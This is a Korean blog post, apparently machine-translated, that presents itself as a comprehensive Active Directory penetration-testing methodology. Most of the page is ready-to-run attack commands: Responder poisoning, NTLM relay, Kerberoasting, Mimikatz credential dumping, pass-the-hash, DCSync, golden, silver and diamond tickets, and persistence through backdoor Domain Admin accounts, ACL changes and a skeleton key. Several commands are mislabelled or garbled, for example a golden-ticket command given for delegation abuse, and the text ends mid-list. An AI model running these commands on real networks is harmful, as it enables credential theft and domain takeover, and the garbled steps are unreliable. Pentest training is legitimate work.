<!DOCTYPE html><html lang="ko"><head><meta charSet="utf-8"/><title>펜테스팅에서의 Active Directory 방법론 포괄적인 가이드 | itposting</title><meta name="description" content=""/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta property="og:url" content="https://itposting.github.io///post/2024-06-19-ActiveDirectoryMethodologyinPentestingAComprehensiveGuide" data-gatsby-head="true"/><meta property="og:type" content="website" data-gatsby-head="true"/><meta property="og:site_name" content="펜테스팅에서의 Active Directory 방법론 포괄적인 가이드 | itposting" data-gatsby-head="true"/><meta property="og:title" content="펜테스팅에서의 Active Directory 방법론 포괄적인 가이드 | itposting" data-gatsby-head="true"/><meta property="og:description" content="" data-gatsby-head="true"/><meta property="og:image" content="/assets/img/2024-06-19-ActiveDirectoryMethodologyinPentestingAComprehensiveGuide_0.png" data-gatsby-head="true"/><meta property="og:locale" content="en_US" data-gatsby-head="true"/><meta name="twitter:card" content="summary_large_image" data-gatsby-head="true"/><meta property="twitter:domain" content="https://itposting.github.io/" data-gatsby-head="true"/><meta property="twitter:url" content="https://itposting.github.io///post/2024-06-19-ActiveDirectoryMethodologyinPentestingAComprehensiveGuide" data-gatsby-head="true"/><meta name="twitter:title" content="펜테스팅에서의 Active Directory 방법론 포괄적인 가이드 | itposting" data-gatsby-head="true"/><meta name="twitter:description" content="" data-gatsby-head="true"/><meta name="twitter:image" content="/assets/img/2024-06-19-ActiveDirectoryMethodologyinPentestingAComprehensiveGuide_0.png" data-gatsby-head="true"/><meta name="twitter:data1" content="Dev | itposting" data-gatsby-head="true"/><meta name="article:published_time" content="2024-06-19 21:17" data-gatsby-head="true"/><meta name="next-head-count" content="19"/><meta name="google-site-verification" content="a-yehRo3k3xv7fg6LqRaE8jlE42e5wP2bDE_2F849O4"/><link rel="stylesheet" href="/favicons/favicon.ico"/><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png"/><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="96x96" href="/assets/favicons/favicon-96x96.png"/><link rel="icon" href="/favicons/apple-icon-180x180.png"/><link rel="apple-touch-icon" href="/favicons/apple-icon-180x180.png"/><link rel="apple-touch-startup-image" href="/startup.png"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="black"/><meta name="msapplication-config" content="/favicons/browserconfig.xml"/><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-23YXDLKDCL"></script><script>window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
          
            gtag('config', 'G-23YXDLKDCL');</script><link rel="preload" href="/_next/static/css/6e57edcf9f2ce551.css" as="style"/><link rel="stylesheet" href="/_next/static/css/6e57edcf9f2ce551.css" data-n-g=""/><link rel="preload" href="/_next/static/css/b8ef307c9aee1e34.css" as="style"/><link rel="stylesheet" href="/_next/static/css/b8ef307c9aee1e34.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-ee6df16fdc6dae4d.js" defer=""></script><script src="/_next/static/chunks/framework-46611630e39cfdeb.js" defer=""></script><script src="/_next/static/chunks/main-cf4a52eec9a970a0.js" defer=""></script><script src="/_next/static/chunks/pages/_app-6fae11262ee5c69b.js" defer=""></script><script src="/_next/static/chunks/75fc9c18-4a646156c659a948.js" defer=""></script><script src="/_next/static/chunks/348-d11c34b645b13f5b.js" defer=""></script><script src="/_next/static/chunks/162-4172e84c8e2aa747.js" defer=""></script><script src="/_next/static/chunks/pages/post/%5Bslug%5D-0fd008072af5a644.js" defer=""></script><script src="/_next/static/FH3Qr-mLAesqA0X5IFRQr/_buildManifest.js" defer=""></script><script src="/_next/static/FH3Qr-mLAesqA0X5IFRQr/_ssgManifest.js" defer=""></script></head><body><div id="__next"><header class="Header_header__Z8PUO"><div class="Header_inner__tfr0u"><strong class="Header_title__Otn70"><a href="/">IT Posting</a></strong><nav class="Header_nav_area__6KVpk"><a class="nav_item" href="/posts/1">Posts</a></nav></div></header><main class="posts_container__NyRU3"><div class="posts_inner__i3n_i"><h1 class="posts_post_title__EbxNx">펜테스팅에서의 Active Directory 방법론 포괄적인 가이드</h1><div class="posts_meta__cR7lu"><div class="posts_profile_wrap__mslMl"><div class="posts_profile_image_wrap__kPikV"><img alt="펜테스팅에서의 Active Directory 방법론 포괄적인 가이드" loading="lazy" width="44" height="44" decoding="async" data-nimg="1" class="profile" style="color:transparent" src="/favicons/apple-icon-114x114.png"/></div><div class="posts_textarea__w_iKT"><span class="writer">IT Posting</span><span class="posts_info__5KJdN"><span class="posts_date__ctqHI">Posted On Jun 19, 2024</span><span class="posts_reading_time__f7YPP">13<!-- --> min read</span></span></div></div><img alt="" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" class="posts_view_badge__tcbfm" style="color:transparent" src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fallround-coder.github.io/post/2024-06-19-ActiveDirectoryMethodologyinPentestingAComprehensiveGuide&amp;count_bg=%2379C83D&amp;title_bg=%23555555&amp;icon=&amp;icon_color=%23E7E7E7&amp;title=views&amp;edge_flat=false"/></div><article class="posts_post_content__n_L6j"><div><!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta content="width=device-width, initial-scale=1" name="viewport">
</head>
<body>
<p>요즘의 디지털 환경에서 Active Directory (AD)는 대부분의 기업 환경에서 네트워크 자원을 관리하는 중추 역할을 합니다. AD는 사용자, 컴퓨터 및 기타 자원을 관리하기 위한 중앙 집중화 및 구조화된 구조를 제공함으로써 복잡한 IT 시스템의 관리를 간편화합니다. 그 중요성을 고려할 때 Active Directory의 보안을 보장하는 것이 매우 중요합니다. 이 문서는 Active Directory의 세부 사항을 들여다보고 AD 환경을 펜테스팅하기 위한 포괄적인 방법론을 개요하고 있습니다. 초보자든 중급 보안 전문가든, 이 안내서는 Active Directory를 효과적으로 펜테스팅하고 취약성을 식별하며 조직의 전체적인 보안 체계를 강화하기 위한 지식과 도구를 제공합니다.</p>
<p><img src="/assets/img/2024-06-19-ActiveDirectoryMethodologyinPentestingAComprehensiveGuide_0.png" alt="Active Directory Methodology in Pentesting - A Comprehensive Guide"></p>
<h2>Active Directory 이해하기</h2>
<h2>주요 개념</h2>
<ul>
<li>디렉터리: 디렉터리는 네트워크 내 객체에 대한 정보를 저장하는 계층적 구조입니다. AD에서 이 디렉터리는 사용자, 컴퓨터 및 기타 리소스에 대한 데이터를 저장하는 데 사용됩니다.</li>
<li>객체: 객체는 AD 내의 다양한 엔티티를 나타냅니다. 일반적인 객체에는 사용자, 그룹, 컴퓨터 및 프린터가 포함됩니다. 각 객체에는 사용자의 이름, 이메일, 비밀번호와 같은 속성이 있습니다.</li>
<li>도메인: 도메인은 동일한 AD 데이터베이스를 공유하는 객체들의 논리적 그룹입니다. 이는 보안 경계 역할을 하며 이러한 객체들의 중앙화된 관리를 제공합니다.</li>
<li>트리: 트리는 계층적 구조로 연결된 하나 이상의 도메인 모음입니다. 트리 내의 도메인은 연속적인 네임스페이스를 공유합니다.</li>
<li>포리스트: 포리스트는 AD에서 최상위 컨테이너이며 하나 이상의 트리로 구성됩니다. 포리스트 내의 트리는 공통 전역 카탈로그, 디렉터리 스키마 및 구성을 공유합니다.</li>
</ul>
<h1>Active Directory 도메인 서비스 (AD DS)</h1>
<p>AD DS는 Active Directory에서 제공하는 핵심 서비스로, 여러 중요 기능을 포함하고 있습니다:</p>
<ul>
<li>도메인 서비스: 인증, 권한 부여 및 디렉터리 서비스를 제공합니다.</li>
<li>인증서 서비스: 안전한 통신을 위해 디지털 인증서를 발급하고 관리합니다.</li>
<li>경량 디렉터리 서비스: 전체 기능이 필요 없는 애플리케이션을 위한 AD DS의 간소화된 버전을 제공합니다.</li>
<li>디렉터리 페더레이션 서비스: 조직 경계를 넘어 단일 로그인(SSO) 기능을 제공합니다.</li>
<li>권리 관리: 암호화 및 정책 시행을 통해 민감한 데이터를 보호합니다.</li>
<li>DNS 서비스: AD와 통합하여 이름 해결 서비스를 제공합니다.</li>
</ul>
<h1>Active Directory 펜테스팅: 방법론과 기술</h1>
<h1>자격 증명 또는 세션 없이 수행하는 정찰</h1>
<p>본격적인 펜테스팅 활동에 들어가기 전에 수동으로 환경을 이해하는 것이 중요합니다. Nmap과 같은 도구를 사용하여 열린 포트와 서비스를 스캔할 수 있습니다. 또한 NetBIOS 및 DNS 열거를 통해 AD 구조 및 사용 가능한 호스트에 대한 유용한 통찰을 얻을 수 있습니다.</p>
<h2>명령어:</h2>
<pre><code class="hljs language-bash">nmap -sP &#x3C;대상_네트워크_범위>
nmap -p 88,135,139,389,445,636,3268,3269,3389 -sV -O &#x3C;대상_IP>
nbtscan &#x3C;대상_네트워크_범위>
nslookup -<span class="hljs-built_in">type</span>=SRV _ldap._tcp.dc._msdcs.&#x3C;도메인>
</code></pre>
<ul>
<li>Nmap</li>
<li>nbtscan</li>
</ul>
<h1>사용자 열거</h1>
<p>ldapsearch 또는 enum4linux와 같은 도구를 사용하여 사용자 열거를 할 수 있습니다. 이 도구들은 LDAP 및 SMB 프로토콜을 활용하여 사용자 및 그룹에 대한 정보를 수집합니다.</p>
<h2>명령어:</h2>
<pre><code class="hljs language-js">ldapsearch -x -h &#x3C;도메인_컨트롤러_IP> -b <span class="hljs-string">"dc=예제,dc=com"</span> <span class="hljs-string">"(objectclass=user)"</span>
enum4linux -U &#x3C;대상_IP>
</code></pre>
<ul>
<li>ldapsearch</li>
<li>enum4linux</li>
</ul>
<h1>LLMNR/NBT-NS 독점공격</h1>
<p>LLMNR 및 NBT-NS 독려는 인증 요청을 캡처하고 중계하는 기술로 사용됩니다. Responder와 같은 도구를 사용하여 이러한 요청을 수신하고 해시를 캡처할 수 있으며, 이는 후속 공격에 사용될 수 있습니다.</p>
<h2>명령어:</h2>
<pre><code class="hljs language-js">sudo responder -I &#x3C;네트워크_인터페이스>
</code></pre>
<ul>
<li>Responder</li>
</ul>
<h1>NTLM 릴레이</h1>
<p>NTLM 릴레이 공격은 NTLM 해시를 캡처하고 다른 서비스로 릴레이하여 무단 액세스를 얻는 것을 의미합니다. NTLMRelayX는 이러한 공격을 수행하는 데 강력한 도구입니다.</p>
<h2>명령어:</h2>
<pre><code class="hljs language-js">sudo ntlmrelayx.<span class="hljs-property">py</span> -tf targets.<span class="hljs-property">txt</span> -smb2support
</code></pre>
<ul>
<li>NTLMRelayX</li>
</ul>
<h1>자격 증명 도용</h1>
<p>Mimikatz와 같은 도구를 사용하여 메모리에서 평문 암호, 해시, PIN 코드 및 케르버로스 티켓을 추출하여 자격 증명 도용이 가능합니다.</p>
<h2>명령어:</h2>
<pre><code class="hljs language-js">mimikatz.<span class="hljs-property">exe</span> <span class="hljs-string">"privilege::debug"</span> <span class="hljs-string">"sekurlsa::logonpasswords"</span> <span class="hljs-string">"exit"</span>
</code></pre>
<ul>
<li>Mimikatz</li>
</ul>
<h1>자격 증명 또는 세션을 사용하여 Active Directory 나열하기</h1>
<p>한 번 자격 증명을 획득하면 BloodHound와 같은 도구를 사용하여 AD 환경을 매핑하고 관련성 및 잠재적인 공격 경로를 식별할 수 있습니다.</p>
<h2>명령어:</h2>
<pre><code class="hljs language-js"><span class="hljs-title class_">SharpHound</span>.<span class="hljs-property">exe</span> -c <span class="hljs-title class_">All</span>
</code></pre>
<ul>
<li>BloodHound</li>
</ul>
<h1>Kerberoasting</h1>
<p>케로버로스팅은 SPN(서비스 주체 이름)에 대한 서비스 티켓을 요청하고 이를 오프라인으로 깨서 평문 암호를 얻는 방법입니다. 이 기술에는 Rubeus와 같은 도구가 일반적으로 사용됩니다.</p>
<h2>명령어:</h2>
<pre><code class="hljs language-js"><span class="hljs-title class_">Rubeus</span>.<span class="hljs-property">exe</span> kerberoast
</code></pre>
<ul>
<li>Rubeus</li>
</ul>
<h1>원격 연결 (RDP, SSH, FTP, Win-RM)</h1>
<p>원격 연결을 악용하려면 Metasploit이나 Cobalt Strike와 같은 도구를 사용하여 RDP, SSH, FTP 및 Win-RM과 같은 서비스를 통해 접근할 수 있습니다.</p>
<h2>명령어:</h2>
<pre><code class="hljs language-js">msfconsole
use exploit/windows/rdp/rdp_login
set <span class="hljs-variable constant_">RHOSTS</span> &#x3C;대상_ip>
set <span class="hljs-variable constant_">USERNAME</span> &#x3C;사용자명>
set <span class="hljs-variable constant_">PASSWORD</span> &#x3C;암호>
run
</code></pre>
<ul>
<li>Metasploit</li>
</ul>
<h1>현재 세션 티켓</h1>
<p>현재 세션 티켓을 분석하면, 하이재킹이나 측면 이동에 악용될 수 있는 활성 세션을 식별하는 데 도움이 됩니다.</p>
<h2>명령어:</h2>
<pre><code class="hljs language-js">klist 세션
</code></pre>
<h1>컴퓨터 공유에서 자격 증명 찾기</h1>
<p>공유 폴더를 스캔하여 저장된 자격 증명을 확인하면 일반 텍스트 암호나 민감한 정보가 포함된 스크립트를 발견할 수 있습니다. SharpHound와 같은 도구를 사용하면 이 프로세스를 자동화할 수 있습니다.</p>
<h2>명령어:</h2>
<pre><code class="hljs language-js"><span class="hljs-title class_">SharpHound</span>.<span class="hljs-property">exe</span> -c <span class="hljs-title class_">Shares</span>
</code></pre>
<ul>
<li>SharpHound</li>
</ul>
<h1>특정 Exploits</h1>
<h2>CVE-2021–1675 (PrintNightmare)</h2>
<p>프린트 악몽(PrintNightmare)은 프린트 스풀러 서비스의 취약점을 악용하는 악용 프로그램입니다. PrintNightmare과 같은 도구는 이를 이용하여 권한 상승을 얻습니다.</p>
<h2>명령어:</h2>
<pre><code class="hljs language-js"><span class="hljs-title class_">PrintNightmare</span>.<span class="hljs-property">exe</span> &#x3C;대상_ip>
</code></pre>
<ul>
<li>PrintNightmare</li>
</ul>
<h2>CVE-2021–34527 (프린트 나이트메어)</h2>
<p>이것은 프린트 나이트메어 취약점의 다른 변형입니다. 적절한 패치 관리와 중요 서버에서 프린트 스풀러 서비스를 비활성화하면 이 위험을 완화할 수 있습니다.</p>
<h2>명령어:</h2>
<pre><code class="hljs language-js"><span class="hljs-title class_">Stop</span>-<span class="hljs-title class_">Service</span> -<span class="hljs-title class_">Name</span> <span class="hljs-title class_">Spooler</span> -<span class="hljs-title class_">Force</span>
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Service</span> -<span class="hljs-title class_">Name</span> <span class="hljs-title class_">Spooler</span> -<span class="hljs-title class_">StartupType</span> <span class="hljs-title class_">Disabled</span>
</code></pre>
<h1>핵심 펜테스팅 기법에 대한 단계별 안내서</h1>
<h1>특권 자격 증명/세션을 이용한 Active Directory 권한 상승</h1>
<ul>
<li>BloodHound와 같은 도구를 사용하여 취약 경로를 식별합니다.</li>
</ul>
<pre><code class="hljs language-js"><span class="hljs-title class_">SharpHound</span>.<span class="hljs-property">exe</span> -c <span class="hljs-title class_">All</span>
</code></pre>
<ol start="2">
<li>토큰 위조 또는 서비스 남용과 같은 기술을 사용하여 경로를 악용합니다.</li>
</ol>
<pre><code class="hljs language-js">mimikatz.<span class="hljs-property">exe</span> <span class="hljs-string">"privilege::debug"</span> <span class="hljs-string">"token::elevate"</span> <span class="hljs-string">"exit"</span>
</code></pre>
<ol start="3">
<li>제한된 리소스에 액세스하려고 시도하여 액세스를 확인합니다.</li>
</ol>
<pre><code class="hljs language-js">dir \\&#x3C;target_ip>\c$
mimikatz.<span class="hljs-property">exe</span> <span class="hljs-string">"privilege::debug"</span> <span class="hljs-string">"sekurlsa::logonpasswords"</span> <span class="hljs-string">"exit"</span>
</code></pre>
<ol start="3">
<li>해시를 추출하려면 sekurlsa::logonpasswords 명령을 실행하세요.</li>
</ol>
<ul>
<li>추출된 해시를 안전하게 저장하여 나중에 사용하세요.</li>
</ul>
<h1>패스 더 해시</h1>
<ul>
<li>대상 계정의 NTLM 해시를 획득하세요.</li>
<li>해당 해시를 Mimikatz나 Pass-the-Hash Toolkit과 같은 도구와 함께 사용하여 평문 암호 없이 인증하세요.</li>
</ul>
<p>mimikatz.exe "privilege::debug" "sekurlsa::pth /user: /domain: /ntlm: /run:cmd.exe" "exit"</p>
<h1>해시/키 전달하기</h1>
<ul>
<li>Mimikatz와 같은 도구를 사용하여 Kerberos 키를 추출합니다.</li>
</ul>
<p>mimikatz.exe "privilege::debug" "sekurlsa::ekeys" "exit"</p>
<ol start="2">
<li>키를 사용하여 Kerberos 티켓을 요청하고 인증하세요.</li>
</ol>
<pre><code class="hljs language-js">mimikatz.<span class="hljs-property">exe</span> <span class="hljs-string">"kerberos::ptt &#x3C;ticket.kirbi>"</span>
</code></pre>
<h1>티켓 전달</h1>
<ul>
<li>Mimikatz를 사용하여 Kerberos 티켓을 추출하세요.</li>
</ul>
<pre><code class="hljs language-js">mimikatz.<span class="hljs-property">exe</span> <span class="hljs-string">"kerberos::list"</span> <span class="hljs-string">"kerberos::ptt &#x3C;ticket.kirbi>"</span> <span class="hljs-string">"exit"</span>
</code></pre>
<ol start="2">
<li>Mimikatz를 사용하여 현재 세션에 티켓을 삽입합니다.</li>
</ol>
<h1>자격 증명 재사용</h1>
<ul>
<li>다른 서비스 간에 재사용된 자격 증명 식별</li>
<li>획득한 자격 증명을 사용하여 다른 서비스에서 인증합니다.</li>
</ul>
<h1>MSSQL 남용 및 신뢰할 수 있는 링크</h1>
<ul>
<li>네트워크 내 MSSQL 서버 식별</li>
</ul>
<pre><code class="hljs language-js">sqlcmd -L
</code></pre>
<ol start="2">
<li>명령 실행 또는 데이터 검색을 위해 신뢰할 수 있는 링크 악용.</li>
</ol>
<pre><code class="hljs language-js">sqlcmd -S &#x3C;대상_서버> -U &#x3C;사용자_이름> -P &#x3C;암호>
</code></pre>
<h1>제약이 없는 위임</h1>
<ul>
<li>제약이 없는 위임이 설정된 계정을 식별합니다.</li>
</ul>
<pre><code class="hljs language-js"><span class="hljs-title class_">Get</span>-<span class="hljs-title class_">ADUser</span> -<span class="hljs-title class_">Filter</span> {<span class="hljs-title class_">TrustedForDelegation</span> -eq $true} -<span class="hljs-title class_">Properties</span> <span class="hljs-title class_">TrustedForDelegation</span>
</code></pre>
<ol start="2">
<li>계정을 위장하여 위임을 남용하십시오.</li>
</ol>
<pre><code class="hljs language-js">mimikatz.<span class="hljs-property">exe</span> <span class="hljs-string">"kerberos::golden /domain:&#x3C;도메인> /sid:&#x3C;도메인SID> /target:&#x3C;대상서비스> /rc4:&#x3C;서비스계정해시> /user:&#x3C;대상사용자> /service:&#x3C;서비스명> /target:&#x3C;대상FQDN>"</span> <span class="hljs-string">"exit"</span>
</code></pre>
<h1>제한된 위임</h1>
<ul>
<li>위임이 허용된 서비스 식별하기.</li>
</ul>
<pre><code class="hljs language-js"><span class="hljs-title class_">Get</span>-<span class="hljs-title class_">ADUser</span> -<span class="hljs-title class_">Filter</span> {msDS-<span class="hljs-title class_">AllowedToDelegateTo</span> -ne $null} -<span class="hljs-title class_">Properties</span> msDS-<span class="hljs-title class_">AllowedToDelegateTo</span>
</code></pre>
<p>서비스 계정을 탈취하여 위임을 악용하십시오.</p>
<h1>리소스 기반 제한된 위임</h1>
<ul>
<li>리소스 기반 위임 설정 식별하기.</li>
</ul>
<pre><code class="hljs language-js"><span class="hljs-title class_">Get</span>-<span class="hljs-title class_">ADComputer</span> -<span class="hljs-title class_">Filter</span> {msDS-<span class="hljs-title class_">AllowedToActOnBehalfOfOtherIdentity</span> -ne $null} -<span class="hljs-title class_">Properties</span> msDS-<span class="hljs-title class_">AllowedToActOnBehalfOfOtherIdentity</span>
</code></pre>
<ol start="2">
<li>권한 상승을 얻기 위해 설정을 악용하세요.</li>
</ol>
<h1>ACL 악용</h1>
<ul>
<li>BloodHound와 같은 도구를 사용하여 ACL 열거.</li>
</ul>
<pre><code class="hljs language-js"><span class="hljs-title class_">SharpHound</span>.<span class="hljs-property">exe</span> -c <span class="hljs-title class_">All</span>
</code></pre>
<ol start="2">
<li>추가 권한을 부여하려면 ACL을 수정하세요.</li>
</ol>
<pre><code class="hljs language-js"><span class="hljs-title class_">Invoke</span>-<span class="hljs-title class_">ACLpwn</span> -<span class="hljs-title class_">Domain</span> &#x3C;도메인> -<span class="hljs-title class_">Principal</span> &#x3C;사용자> -<span class="hljs-title class_">AddFullControl</span>
</code></pre>
<h1>프린터 스풀러 서비스 남용</h1>
<ul>
<li>알려진 취약점을 이용하여 프린트 스풀러 서비스를 악용합니다.</li>
<li>해당 서비스를 악용하여 권한을 상승시킵니다.</li>
</ul>
<pre><code class="hljs language-js"><span class="hljs-title class_">PrintNightmare</span>.<span class="hljs-property">exe</span> &#x3C;대상_ip>
</code></pre>
<h1>타사 세션 남용</h1>
<ul>
<li>활성 타사 세션을 식별합니다.</li>
</ul>
<pre><code class="hljs language-js">klist 세션
</code></pre>
<ol start="2">
<li>불허된 접근 권한을 얻기 위해 세션을 해킹하세요.</li>
</ol>
<h1>LAPS</h1>
<ul>
<li>AD에 저장된 LAPS 비밀번호를 검색하세요.</li>
</ul>
<pre><code class="hljs language-ps"><span class="hljs-built_in">Get-ADComputer</span> <span class="hljs-literal">-Filter</span> * <span class="hljs-literal">-Property</span> <span class="hljs-string">"ms-MCS-AdmPwd"</span> | <span class="hljs-built_in">Select-Object</span> Name, <span class="hljs-string">"ms-MCS-AdmPwd"</span>
</code></pre>
<ol start="2">
<li>지역 관리자 계정에 접근하기 위해 비밀번호를 사용하세요.</li>
</ol>
<h1>인증서 도난</h1>
<ul>
<li>AD에 저장된 인증서를 식별하세요.</li>
</ul>
<pre><code class="hljs language-js">certutil -store -user <span class="hljs-title class_">My</span>
</code></pre>
<ol start="2">
<li>Certify와 같은 도구를 사용하여 인증서를 추출하세요.</li>
</ol>
<pre><code class="hljs language-js"><span class="hljs-title class_">Certify</span>.<span class="hljs-property">exe</span> find /<span class="hljs-attr">type</span>:domain
</code></pre>
<h1>인증서 템플릿 남용</h1>
<ul>
<li>자격증 템플릿 나열하기</li>
</ul>
<pre><code class="hljs language-js">certutil -<span class="hljs-title class_">TCAInfo</span>
</code></pre>
<ul>
<li>설정이 잘못된 템플릿을 남용하여 상위 권한 획득하기</li>
</ul>
<pre><code class="hljs language-js"><span class="hljs-title class_">Certify</span>.<span class="hljs-property">exe</span> request /<span class="hljs-attr">ca</span>:&#x3C;CA Name> /template:&#x3C;Template Name>
</code></pre>
<h1>고 권한 계정으로 Post-Exploitation</h1>
<ul>
<li>DCSync와 같은 도구를 사용하여 도메인 자격 증명 덤프하기.</li>
</ul>
<pre><code class="hljs language-js">mimikatz.<span class="hljs-property">exe</span> <span class="hljs-string">"lsadump::dcsync /domain:&#x3C;도메인> /user:&#x3C;사용자>"</span> <span class="hljs-string">"exit"</span>
</code></pre>
<ol start="2">
<li>새 계정 생성 또는 그룹 멤버쉽 수정을 통해 권한 상승하기.</li>
</ol>
<pre><code class="hljs language-js">net user &#x3C;username> &#x3C;password> /add
net group <span class="hljs-string">"Domain Admins"</span> &#x3C;username> /add
</code></pre>
<h1>도메인 자격 증명 덤프</h1>
<ul>
<li>Mimikatz를 사용하여 DCSync 실행.</li>
</ul>
<pre><code class="hljs language-js">mimikatz.<span class="hljs-property">exe</span> <span class="hljs-string">"lsadump::dcsync /domain:&#x3C;domain> /user:&#x3C;user>"</span> <span class="hljs-string">"exit"</span>
</code></pre>
<ol start="2">
<li>덤프된 자격 증명은 안전하게 저장하세요.</li>
</ol>
<h1>권한 상승 및 지속성</h1>
<ul>
<li>백도어 계정 생성을 통해 액세스 유지</li>
</ul>
<pre><code class="hljs language-js">net user &#x3C;username> &#x3C;password> /add
</code></pre>
<ol start="2">
<li>보안 설명자를 수정하여 지속성을 확보합니다.</li>
</ol>
<pre><code class="hljs language-js"><span class="hljs-title class_">Set</span>-<span class="hljs-variable constant_">ACL</span> -경로 <span class="hljs-string">"AD:&#x3C;경로>"</span> -<span class="hljs-title class_">ACLObject</span> $acl
</code></pre>
<h1>실버 티켓</h1>
<ul>
<li>서비스 계정 해시를 사용하여 실버 티켓을 생성합니다.</li>
</ul>
<pre><code class="hljs language-js">mimikatz.<span class="hljs-property">exe</span> <span class="hljs-string">"kerberos::golden /domain:&#x3C;도메인> /sid:&#x3C;도메인_SID> /target:&#x3C;대상_서비스> /rc4:&#x3C;서비스_계정_해시> /user:&#x3C;대상_사용자> /service:&#x3C;서비스_이름> /target:&#x3C;대상_FQDN>"</span> <span class="hljs-string">"exit"</span>
</code></pre>
<ol start="2">
<li>도메인 컨트롤러와 통신하지 않고 서비스에 인증합니다.</li>
</ol>
<h1>골든 티켓</h1>
<ul>
<li>KRBTGT 계정 해시를 추출합니다.</li>
</ul>
<pre><code class="hljs language-js">mimikatz.<span class="hljs-property">exe</span> <span class="hljs-string">"lsadump::dcsync /domain:&#x3C;도메인> /user:krbtgt"</span> <span class="hljs-string">"exit"</span>
</code></pre>
<ol start="2">
<li>도메인 관리자 권한을 얻기 위해 골든 티켓 생성.</li>
</ol>
<pre><code class="hljs language-js">mimikatz.<span class="hljs-property">exe</span> <span class="hljs-string">"kerberos::golden /user:&#x3C;사용자이름> /domain:&#x3C;도메인> /sid:&#x3C;도메인SID> /krbtgt:&#x3C;krbtgt 해시> /id:&#x3C;사용자ID> /groups:&#x3C;그룹ID들>"</span> <span class="hljs-string">"exit"</span>
</code></pre>
<h1>다이아몬드 티켓</h1>
<ul>
<li>특별 권한이 있는 다이아몬드 티켓을 만들어보세요.</li>
</ul>
<pre><code class="hljs language-js">mimikatz.<span class="hljs-property">exe</span> <span class="hljs-string">"kerberos::golden /user:&#x3C;username> /domain:&#x3C;domain> /sid:&#x3C;domain_sid> /krbtgt:&#x3C;krbtgt_hash> /id:&#x3C;user_id> /groups:&#x3C;group_ids> /extra:&#x3C;extra_privileges>"</span> <span class="hljs-string">"exit"</span>
</code></pre>
<ol start="2">
<li>네트워크 내에서 특정 작업에 해당 티켓을 사용하세요.</li>
</ol>
<h1>인증서 계정 지속성</h1>
<ul>
<li>지속성을 유지하기 위해 인증서 템플릿을 남용하지 않도록 주의하세요.</li>
</ul>
<pre><code class="hljs language-js"><span class="hljs-title class_">Certify</span>.<span class="hljs-property">exe</span> request /<span class="hljs-attr">ca</span>:&#x3C;CA Name> /template:&#x3C;Template Name>
</code></pre>
<ol start="2">
<li>인증서를 다시 발급하여 계속된 액세스를 보장하세요.</li>
</ol>
<pre><code class="hljs language-js"><span class="hljs-title class_">Certify</span>.<span class="hljs-property">exe</span> renew /<span class="hljs-attr">id</span>:&#x3C;cert_id>
</code></pre>
<h1>인증서 도메인 지속성</h1>
<ul>
<li>도메인 인증서를 수정하여 상위 액세스를 유지하세요.</li>
<li>주기적으로 인증서를 갱신하여 지속적인 액세스를 보장하세요.</li>
</ul>
<pre><code class="hljs language-js"><span class="hljs-title class_">Certify</span>.<span class="hljs-property">exe</span> renew /<span class="hljs-attr">id</span>:&#x3C;cert_id>
</code></pre>
<h1>AdminSDHolder 그룹</h1>
<ul>
<li>AdminSDHolder 그룹 설정을 수정합니다.</li>
</ul>
<pre><code class="hljs language-js"><span class="hljs-title class_">Set</span>-<span class="hljs-title class_">ADObject</span> -<span class="hljs-title class_">Identity</span> <span class="hljs-string">"CN=AdminSDHolder,CN=System,DC=&#x3C;도메인>,DC=com"</span> -<span class="hljs-title class_">Replace</span> @{adminCount=<span class="hljs-number">1</span>}
</code></pre>
<ol start="2">
<li>변경 사항이 전파되도록 상위 권한을 유지합니다.</li>
</ol>
<pre><code class="hljs language-js"><span class="hljs-title class_">Set</span>-<span class="hljs-title class_">ADUser</span> -<span class="hljs-title class_">Identity</span> &#x3C;사용자이름> -<span class="hljs-title class_">Replace</span> @{adminCount=<span class="hljs-number">1</span>}
</code></pre>
<h1>DSRM 자격 증명</h1>
<ul>
<li>도메인 컨트롤러에서 DSRM 자격 증명을 검색합니다.</li>
</ul>
<pre><code class="hljs language-js">ntdsutil <span class="hljs-string">"set dsrm password"</span> <span class="hljs-string">"reset password on server &#x3C;서버명>"</span> <span class="hljs-string">"quit"</span>
</code></pre>
<ol start="2">
<li>이 자격 증명을 사용하여 디렉터리 서비스 복원 모드(Directory Services Restore Mode)에서 DC에 액세스합니다.</li>
</ol>
<h1>ACL 지속성</h1>
<ul>
<li>접근을 유지하기 위해 ACL을 수정하세요.</li>
</ul>
<pre><code class="hljs language-js"><span class="hljs-title class_">Invoke</span>-<span class="hljs-title class_">ACLpwn</span> -<span class="hljs-title class_">Domain</span> &#x3C;도메인> -<span class="hljs-title class_">Principal</span> &#x3C;사용자> -<span class="hljs-title class_">AddFullControl</span>
</code></pre>
<ol start="2">
<li>변경 내용이 삭제되지 않도록 보호하여 지속성을 보장하세요.</li>
</ol>
<h1>보안 기술자</h1>
<ul>
<li>잘못된 설정을 위한 보안 기술자 분석</li>
</ul>
<pre><code class="hljs language-js"><span class="hljs-title class_">Get</span>-<span class="hljs-variable constant_">ACL</span> -<span class="hljs-title class_">Path</span> <span class="hljs-string">"AD:&#x3C;경로>"</span>
</code></pre>
<ol start="2">
<li>특권 상승을 위해 잘못된 설정을 이용하세요.</li>
</ol>
<pre><code class="hljs language-js"><span class="hljs-title class_">Set</span>-<span class="hljs-variable constant_">ACL</span> -<span class="hljs-title class_">Path</span> <span class="hljs-string">"AD:&#x3C;경로>"</span> -<span class="hljs-title class_">ACLObject</span> $acl
</code></pre>
<h1>스켈레톤 키</h1>
<ul>
<li>도메인 컨트롤러에 스켈레톤 키를 배포합니다.</li>
</ul>
<pre><code class="hljs language-js">mimikatz.<span class="hljs-property">exe</span> <span class="hljs-string">"privilege::debug"</span> <span class="hljs-string">"misc::skeleton"</span> <span class="hljs-string">"exit"</span>
</code></pre>
<ol start="2">
